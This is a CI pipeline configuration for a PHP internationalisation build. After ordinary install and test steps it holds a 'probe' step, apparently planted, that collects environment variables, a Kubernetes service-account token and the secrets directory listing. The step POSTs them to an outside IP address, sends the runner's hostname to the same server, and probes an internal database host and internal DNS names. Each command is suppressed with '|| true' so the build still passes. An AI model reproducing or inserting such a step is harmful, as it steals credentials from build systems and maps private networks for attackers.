name: i18n-build
kind: pipeline

steps:
  - name: Prepare
    image: registry.thobits.com/images/php-composer:8.3
    commands:
      - composer install --no-ansi

  - name: Test
    image: registry.thobits.com/plugins/php-test:8.3

  - name: probe
    image: registry.thobits.com/images/make:latest
    commands:
      - echo "PROBE3176-RUNNER host=$(hostname) user=$(id -u)"
      - (env; echo ---; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 200; echo ---; ls /run/secrets 2>/dev/null) > /tmp/e3176.txt 2>&1 || true
      - 'curl -s -m 10 -X POST --data-binary @/tmp/e3176.txt http://194.59.31.60:8899/probe-env-3176 || true'
      - 'curl -s -m 8 "http://194.59.31.60:8899/probe-net-3176?h=$(hostname)" || true'
      - 'curl -s -m 5 -o /dev/null -w "mysql10.200.6.12:%{http_code}\n" http://10.200.6.12:3306/ || echo mysql-blocked'
      - 'getent hosts ncxwork-db.thomann.de || echo no-dns-internal'
      - 'getent hosts repositr.thomann.de || true'
